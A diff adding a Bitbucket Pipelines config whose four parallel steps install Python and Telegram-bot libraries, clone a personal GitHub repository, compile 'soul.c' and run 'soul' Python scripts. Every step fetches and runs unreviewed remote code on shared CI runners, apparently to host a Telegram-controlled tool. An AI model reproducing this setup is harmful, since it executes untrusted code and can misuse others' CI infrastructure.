@@ -1,0 +1,76 @@
+image: rockylinux
+
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: "Run 5-Minute Show"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/smakaefa26522/krishna.git
+              - cd krishna
+              - gcc soul.c -o soul -lpthread
+              - python soul.py
+
+        - step:
+            name: "API Step 1"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/smakaefa26522/krishna.git
+              - cd krishna
+              - gcc soul.c -o soul -lpthread
+              - python soul2.py
+
+        - step:
+            name: "API Step 2"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/smakaefa26522/krishna.git
+              - cd krishna
+              - gcc soul.c -o soul -lpthread
+              - python soul3.py
+
+        - step:
+            name: "API Step 3"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/smakaefa26522/krishna.git
+              - cd krishna
+              - gcc soul.c -o soul -lpthread
+              - python soul4.py
